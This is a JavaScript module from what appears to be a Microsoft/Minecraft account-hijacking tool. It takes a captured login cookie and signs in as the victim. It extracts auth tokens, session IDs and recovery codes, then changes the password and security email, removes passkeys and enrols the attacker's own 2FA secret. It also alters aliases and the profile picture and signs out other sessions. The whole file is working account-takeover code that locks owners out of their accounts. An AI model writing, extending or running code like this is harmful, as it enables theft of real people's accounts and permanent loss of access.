/// Fix paths

// secure
const generate = require("../utils/generate");
const { domains } = require("../../../config.json");
const getCookies = require("./getCookies");
const recoveryCode = require("./recoveryCode");
const securityInformation = require("./securityInformation");
const polishHost = require("./polishHost");
const recoveryCodeSecure = require("./recoveryCodeSecure");
const addzyger = require("./addzyger");
const { queryParams } = require("../../../db/database");
const getMSAToken = require("./getmsatoken");
const HttpClient = require("../process/HttpClient");

// cookies
const cookies = require("./Cookies/cookies");

// minecraft
const xbl = require('../minecraft/xbl');
const ssid = require('../minecraft/ssid');
const profile = require("../minecraft/profile");

// security
const disableTfa = require("./disableTfa");
const loginHelper = require("./loginhelper");
const handlerecsecure = require("../sections/handlerecsecure");

// info
const { getmxbl } = require("./getxbl3");

// sections
const { getinfo } = require("../sections/getinfo");
const mcextra = require("../sections/mcextra");
const removesection = require("../sections/removesection");
const aliasses = require("../sections/aliasses");
const changeinfo = require("../sections/changeinfo");

// helpers
const {
    updateStatus,
    updateExtraInformation,
    logDuration,
    getAcc,
    initializesecure,
    newgamertag,
    generateValidGamertag,
    isUrl,
    getCachedUUID  // ✅ FIXED: Added missing import
} = require("../process/helpers");

// utils
const fs = require('fs');
const path = require('path');
const changepfp = require("../changeinfo/changePfp");
const removePassKeys = require("../logout/removePassKeys");
const checkmc = require("../../../db/checkmc");
const autonotifier = require("./recode/autonotifier");
const newinfo = require("./recode/newinfo");
const getsecuredata = require("./recode/getsecuredata");
const getsecureinfo = require("./recode/getsecureinfo");
const recoveryCodefix = require("./recoveryCodefix");
const getverificationtoken = require("./getverificationtoken");

function timeTracker(label = "TimeTracker") {
    const startTime = Date.now();

    async function end() {
        const endTime = Date.now();
        const durationSeconds = ((endTime - startTime) / 1000).toFixed(2);
        const lines = [];

        lines.push(`${label} duration: ${durationSeconds} seconds`);

        if (label === "Finishing & New Info") {
            lines.push('----------------------');
        }

        const logMessage = lines.join('\n') + '\n';

        return new Promise((resolve, reject) => {
            fs.appendFile('./timelog.txt', logMessage, 'utf8', (err) => {
                if (err) {
                    console.error(`Error writing to file:`, err);
                    reject(err);
                } else {
                    resolve(durationSeconds);
                }
            });
        });
    }

    return { end };
}

module.exports = async (host, settings, uid, username = null) => {
    console.log(`[RECODE_SECURE] Starting secure process for UID: ${uid}, username: ${username || 'none'}`);
    const initializetimer = timeTracker("Initialize");
    
    /**
     * Initialize
     */
    console.log(`[RECODE_SECURE] Initializing secure process...`);
    let acc = await getAcc();
    acc.loginCookie = host;
    console.log(`[RECODE_SECURE] Account object created, login cookie set`);
    let axios = await initializesecure(uid);
    console.log(`[RECODE_SECURE] Axios instance initialized for UID: ${uid}`);
    await updateStatus(uid, "msauth", host);
    console.log(`[RECODE_SECURE] Status updated: msauth for UID: ${uid}`);
    console.log(`Starting recode secure!`);
    let accstarted = Date.now();
    
    let optionalusername = false;
    if (username) {
        optionalusername = true;
        console.log(`[RECODE_SECURE] Optional username provided: ${username}`);
    }
    
    /**
     * Get Cookies and Auth
     */
    console.log(`[RECODE_SECURE] Getting cookies and authentication...`);
    const [apiCanary, amsc, canary] = await getCookies();
    console.log(`[RECODE_SECURE] Cookies retrieved: apiCanary=${!!apiCanary}, amsc=${!!amsc}, canary=${!!canary}`);
    
    console.log(`[RECODE_SECURE] Polishing host with amsc...`);
    let msauth;
    try {
        msauth = await polishHost(host, amsc);
        console.log(`[RECODE_SECURE] Host polished, msauth result: ${msauth ? 'success' : msauth}`);
    } catch (error) {
        console.log(`[RECODE_SECURE] Error polishing host:`, error.message);
        if (error.response && error.response.status === 400) {
            console.log(`[RECODE_SECURE] HTTP 400 error during host polishing - likely invalid session`);
            acc.email = "Invalid session";
            acc.secEmail = "Invalid session";
            acc.recoveryCode = "Invalid session";
            acc.password = "Invalid session";
            acc.status = "invalid_session";
            return acc;
        }
        throw error;
    }
    
    if (msauth === "locked") {
        console.log("[RECODE_SECURE] Account is locked!");
        acc.email = "Locked!";
        acc.secEmail = "Locked!";
        acc.recoveryCode = "Locked!";
        acc.password = "Locked!";
        acc.ssid = "Locked!";
        return acc;
    }
    
    if (msauth === "down") {
        console.log("[RECODE_SECURE] Microsoft services are down!");
        acc.email = "Microsoft services are down!";
        acc.secEmail = "Microsoft services are down!";
        acc.recoveryCode = "Microsoft services are down!";
        acc.password = "Microsoft services are down!";
        acc.ssid = "Microsoft services are down!";
        return acc;
    }
    
    /**
     * Set Login Cookies
     */
    console.log(`[RECODE_SECURE] Setting login cookies...`);
    axios.axios.defaults.headers.common["canary"] = apiCanary;
    axios.setCookie(`__Host-MSAAUTH=${msauth}`);
    axios.setCookie(`amsc=${amsc}`);
    console.log(`[RECODE_SECURE] Login cookies set successfully`);
    
    /**
     * Login Authentication
     */
    console.log(`[RECODE_SECURE] Starting login authentication...`);
    let login;
    try {
        login = await loginHelper(axios);
        console.log(`[RECODE_SECURE] Login helper result: ${login}`);
    } catch (error) {
        console.log(`[RECODE_SECURE] Error during login authentication:`, error.message);
        if (error.response && error.response.status === 400) {
            console.log(`[RECODE_SECURE] HTTP 400 error during login - authentication failed`);
            acc.email = "Authentication failed";
            acc.secEmail = "Authentication failed";
            acc.recoveryCode = "Authentication failed";
            acc.password = "Authentication failed";
            acc.status = "auth_failed";
            return acc;
        }
        login = "unauthed";
        console.log(`[RECODE_SECURE] Treating error as unauthed state`);
    }
    
    if (login == "locked") {
        console.log("[RECODE_SECURE] Login failed: Account locked");
        acc.email = "Locked!";
        acc.secEmail = "Locked!";
        acc.recoveryCode = "Locked!";
        acc.password = "Locked!";
        acc.status = "locked";
        return acc;
    } else if (login == "unauthed") {
        console.log("[RECODE_SECURE] Login failed: Unauthorized");
        acc.email = "unauthed";
        acc.secEmail = "unauthed";
        acc.recoveryCode = "unauthed";
        acc.password = "unauthed";
        acc.status = "unauthed";
        return acc;
    } else if (login == "child") {
        console.log("[RECODE_SECURE] Login failed: Child account");
        acc.email = "Child landing, try login via auth!";
        acc.secEmail = "Child landing!";
        acc.recoveryCode = "Child landing!";
        acc.password = "Child landing!";
        acc.status = "Child landing!";
        return acc; 
    }

    console.log('[RECODE_SECURE] Login successful, proceeding with authentication...');
    console.log('Logged in fully authed, should be able to get amrp now!');

    initializetimer.end();

    const getauthtimer = timeTracker("Get Cookies");
    
    /**
     * Get Auth Cookies
     */
    let hasamc = true;
    let source = null;
    let mxbl = null;

    // Add timeout wrapper for operations
    const timeoutPromise = (promise, timeoutMs = 30000) => {
        return Promise.race([
            promise,
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Operation timed out')), timeoutMs)
            )
        ]);
    };

    // ✅ FIXED: Get verification token BEFORE calling cookies
    console.log('🔑 Getting verification token...');
    const verificationtoken = await getverificationtoken(axios);
    axios.axios.defaults.headers.common['__RequestVerificationToken'] = verificationtoken;
    console.log('✓ Verification token set');

    // Get cookies with proper auth context
    console.log('🍪 Extracting cookies...');
    let cookiedata;
    try {
        cookiedata = await timeoutPromise(cookies(axios), 30000);
        console.log('✓ Cookie extraction completed');
    } catch (error) {
        console.log('❌ Cookie extraction failed:', error.message);
        acc.email = "Cookie extraction failed";
        acc.secEmail = "Cookie extraction failed";
        acc.recoveryCode = "Cookie extraction failed";
        acc.password = "Cookie extraction failed";
        acc.status = "cookie_failed";
        return acc;
    }

    // Run other operations in parallel
    let [xblResult, mxblresult, msatoken] = await Promise.allSettled([
        timeoutPromise(xbl(acc.loginCookie), 45000),
        timeoutPromise(getmxbl(msauth), 30000),
        timeoutPromise(getMSAToken(msauth), 30000)
    ]).then(results => results.map(result => 
        result.status === 'fulfilled' ? result.value : null
    ));

    // Handle null cookiedata
    if (!cookiedata || !cookiedata.cookies) {
        console.log("[RECODE_SECURE] Cookie data is null, likely timed out or failed");
        acc.email = "Cookie data failed";
        acc.secEmail = "Cookie data failed";
        acc.recoveryCode = "Cookie data failed";
        acc.password = "Cookie data failed";
        acc.status = "cookie_failed";
        return acc;
    }

    const freshamc = cookiedata.cookies.amc;
    const freshjwt = cookiedata.cookies.jwt;
    const freshamrp = cookiedata.cookies.amrp;
    let refresh = null;
    let playstationxbl = null;
    let purchasetoken = null;
    
    if (mxblresult) {
        mxbl = mxblresult.xbl;
        refresh = mxblresult.refresh;
    }

    const tokenobj = {
        apiCanary: apiCanary,
        amsc: amsc,
        amrp: freshamrp,
        amc: freshamc,
        jwt: freshjwt,
        msatoken: msatoken 
    };

    // 16h refresh (usertoken)
    await updateExtraInformation(uid, "xblrefresh", refresh);

    if (cookiedata.status === "unauthed") {
        acc.email = "unauthed";
        acc.secEmail = "unauthed";
        acc.recoveryCode = "unauthed";
        acc.password = "unauthed";
        acc.status = "unauthed";
        return acc;
    }

    acc.aftersecure = true;

    if (cookiedata.status === "noamc") {
        hasamc = false;
    }

    getauthtimer.end();

    const minecraftimer = timeTracker("Minecraft Timer");

    console.log("Checking Minecraft account");
    try {
        if (!xblResult) {
            console.log("[RECODE_SECURE] XBL result is null, likely timed out or failed");
            acc.mc = "XBL Failed";
            acc.newName = "XBL Failed";
            source = "XBL Failed";
        } else if (typeof xblResult === "string" && xblResult === "tfa") {
            console.log("xbl was blocked!");
            acc.mc = "Maybe (dm SyncVape asap)";
            acc.newName = "Unknown";
            source = "Maybe has MC";
        }

        if (xblResult) {
            purchasetoken = xblResult.purchasingtoken;
            playstationxbl = xblResult.playxbl;
            acc.xuid = xblResult.xuid || null;
            let XBL = xblResult.XBL || null;
            acc.gamertag = xblResult.gtg || null;
            acc.gtg = xblResult.gtg || null;
            await updateExtraInformation(uid, "gtg", acc.gamertag);

            let sid, minecraft = null;
            if (XBL) {
                acc.xbl = XBL;
                console.log(`Got XBL`);
                sid = await ssid(XBL);

                if (sid) {
                    console.log(`Got SSID`);
                    acc.ssid = sid;
                    minecraft = await profile(sid);
                    await updateExtraInformation(uid, "mcitems", JSON.stringify(minecraft.items));

                    if (minecraft?.name) {
                        console.log(`Minecraft source: ${minecraft.source}`);
                        source = minecraft?.source;
                        await updateStatus(uid, "username", minecraft.name);
                        acc.oldName = minecraft.name;
                        console.log(`Got Minecraft ${minecraft.name}`);
                        acc.capes = minecraft?.capes;
                        acc.newName = minecraft.name;
                    } else {
                        await updateStatus(uid, "username", 'No Minecraft Profile');
                    }
                }
            } else {
                await updateStatus(uid, "username", 'No Xbox Profile [1]');
            }
        } else {
            await updateStatus(uid, "username", 'No Xbox Profile [2]');
        }

        if (!source) {
            acc.newName = "No Minecraft!";
            if (!settings.secureifnomc) {
                acc.newName = "No Minecraft!";
                acc.ssid = "No Minecraft!";
                console.log('Returning!');
                acc.email = "No Minecraft!";
                acc.secEmail = "No Minecraft!";
                acc.recoveryCode = "No Minecraft!";
                acc.password = "No Minecraft!";
                return acc;
            }
        } else {
            console.log(`Setting mc as ${source}`);
            acc.mc = source;
        }
    } catch (e) {
        console.log(`Failed in minecraft block!`);
        console.log(e);
    }

    if (checkmc(acc.mc)) {
        await updateExtraInformation(uid, "hasmc", true);
    } else {
        await updateExtraInformation(uid, "hasmc", false);
    }

    minecraftimer.end();

    const getsecdatatimer = timeTracker("Get Security Data");

    const securedata = await getsecuredata(axios, uid, apiCanary, tokenobj);

    if (securedata?.email) {
        acc.email = securedata.email;
        acc.oldEmail = securedata.email;
    } else {
        console.log(`Couldn't get email!`);
    }

    const aliaseslist = securedata?.aliases || [];
    const canary2 = securedata?.canary;
    let recovery = securedata?.recovery;
    const disabledtfa = securedata?.disabledtfa;
    const securityParameters = securedata?.securityparams;

    if (!securedata?.recovery) {
        console.log(`Regenerating recovery!`);
        recovery = await recoveryCode(axios, securityParameters?.netId, apiCanary, tokenobj);
    } 

    if (!recovery) {
        console.log(`[Important error] Couldn't grab Recovery Code`);
    }

    const { secEmail, password } = await getsecureinfo(settings);
    acc.recoverydata.email = acc.email || "Failed";
    acc.recoverydata.recovery = recovery || "Failed";
    acc.recoverydata.secemail = secEmail || "Failed";
    acc.recoverydata.password = password || "Failed";

    getsecdatatimer.end();

    /// All securepromises
    const securepromisetime = timeTracker("Securing Promises");
    const securePromises = [];

    let changedpfp = "Failed (unknown)";
    securePromises.push((async () => {
        if (settings.changepfp) {
            const newpfp = settings.pfp;
            if (newpfp && isUrl(newpfp)) {
                console.log(`Changing pfp!`);
                const worked = await changepfp(freshamc, freshjwt, newpfp);
                changedpfp = worked ? "Set" : "Failed to set";
            } else {
                changedpfp = "Invalid URL";
            }
        } else {
            changedpfp = "Option is off.";
        }
        await updateExtraInformation(uid, "newpfp", changedpfp);
    })());

    securePromises.push((async () => {
        const extramc = await mcextra(axios, refresh, acc.xuid, acc.gtg, settings, settings.user_id, uid, acc.loginCookie, acc.ssid, acc.mc, acc.oldName, optionalusername, username, mxbl);
        if (extramc?.newign) acc.newName = extramc.newign;
        if (extramc?.banchecked) {
            acc.ban = extramc.ban;
            acc.banReason = extramc.banReason;
        }
    })());

    securePromises.push((async () => {
        const passkeysremoved = await removePassKeys(axios, securityParameters);
        if (passkeysremoved > 0) console.log(`Passkeys removed: ${passkeysremoved}`);
    })());

    // Get account info
    securePromises.push((async () => {
        const inforesult = await getinfo(hasamc, acc.oldName, axios, msatoken, uid, acc?.mc, acc?.ssid, playstationxbl, purchasetoken);
        acc.stats = inforesult?.stats;

        if (inforesult?.cosmetics || inforesult?.emotes) {
            acc.lunar = {
                cosmetics: inforesult.cosmetics?.allcosmetics || "None",
                plusCosmetics: inforesult.cosmetics?.lunarfreecosmetics || "None",
                equippedCosmetics: inforesult.cosmetics?.equippedcosmetics || "None",
                emotes: inforesult.emotes?.allemotes || "None",
                equippedEmotes: inforesult.emotes?.equippedemotes || "None",
                rank: inforesult.cosmetics?.lunarrank || "None",
                cosamount: inforesult.cosmetics?.cosmeticamount,
                emoteamount: inforesult.emotes?.emotesamount
            };
        }
    })());

    let addzygerReadyResolve;
    const addzygerReady = new Promise((resolve) => {
        addzygerReadyResolve = resolve;
    });

    securePromises.push((async () => {
        if (recovery) {
            const notSecuredNote = "Not changed (check status button";
            const newData = await handlerecsecure(disabledtfa, axios, securityParameters?.netId, acc.email, recovery, secEmail, password, settings, apiCanary, tokenobj);
            acc.password = newData.password || notSecuredNote;
            acc.secEmail = newData.secEmail || notSecuredNote;
            acc.recoveryCode = newData.recoveryCode || recovery;
            await updateStatus(uid, "secemail", acc.secEmail);
            await updateStatus(uid, "password", acc.password);
            await updateStatus(uid, "recoverycode", `${recovery} -> ${acc.recoveryCode}`);
            addzygerReadyResolve(true);
        } else {
            acc.recoveryCode = "Failed to generate";
            const newData = await recoveryCodefix(axios, securityParameters);
            if (newData.secured) {
                acc.password = newData.password || "";
                acc.secEmail = newData.secEmail || "";
                acc.recoveryCode = newData.recoveryCode;
                await updateStatus(uid, "secemail", acc.secEmail);
                await updateStatus(uid, "password", acc.password);
                await updateStatus(uid, "recoverycode", `${recovery} -> ${acc.recoveryCode}`);
                addzygerReadyResolve(true);
            } else {
                addzygerReadyResolve(false);
            }
        }
    })());

    securePromises.push((async () => {
        const ready = await addzygerReady;
        if (ready && settings.addzyger) {
            console.log("Adding Zyger!");
            try {
                const { success, secretKey } = await addzyger(axios, apiCanary);
                if (success) {
                    console.log("TFA successfully confirmed!");
                    await updateStatus(uid, "secretkey", secretKey);
                    acc.secretkey = secretKey;
                } else {
                    console.log("Enabling 2FA failed!");
                    acc.secretkey = "Failed to add";
                    await updateStatus(uid, "secretkey", acc.secretkey);
                }
            } catch (error) {
                console.error("Error adding Zyger:", error);
                acc.secretkey = "Failed to add";
                await updateStatus(uid, "secretkey", acc.secretkey);
            }
        } else {
            await updateStatus(uid, "secretkey", 'Option is disabled.');
            acc.secretkey = 'Option is disabled.';
        }
    })());

    securePromises.push((async () => {
        const updatedAcc = await aliasses(axios, canary2, uid, acc, aliaseslist, acc.email, settings, apiCanary, cookiedata, amsc);
        acc = updatedAcc;
        await updateStatus(uid, "email", `${acc.oldEmail} -> ${acc.email} (Alias check)`);
    })());

    securePromises.push((async () => {
        await changeinfo(uid, settings, axios, freshamc, freshjwt, acc.changedpfp, verificationtoken);
        await removesection(settings, settings.exploit, settings.signout, uid, axios, securityParameters);
    })());

    await Promise.all(securePromises);
    securepromisetime.end();

    const finishtimer = timeTracker("Finishing & New Info");
    const updatedinfo = await newinfo(axios, uid);
    if (updatedinfo?.newprimary) acc.email = updatedinfo.newprimary;

    await updateStatus(uid, "email", `${acc.oldEmail} -> ${acc.email} (New-Info check)`);

    let extrainfodata = await queryParams(`SELECT * FROM extrainformation WHERE uid=?`, [uid]);

    acc.timeTaken = Math.round((Date.now() - accstarted) / 100) / 10;
    acc.uid = uid;
    
    // For minecraft button
    await Promise.all([
        updateExtraInformation(uid, "ssid", acc.ssid),
        updateExtraInformation(uid, "capes", JSON.stringify(acc.capes || [])),
        updateExtraInformation(uid, "lunar", JSON.stringify(acc.lunar || {})),
        updateExtraInformation(uid, "username", acc.newName)
    ]);

    finishtimer.end();
    return acc;
};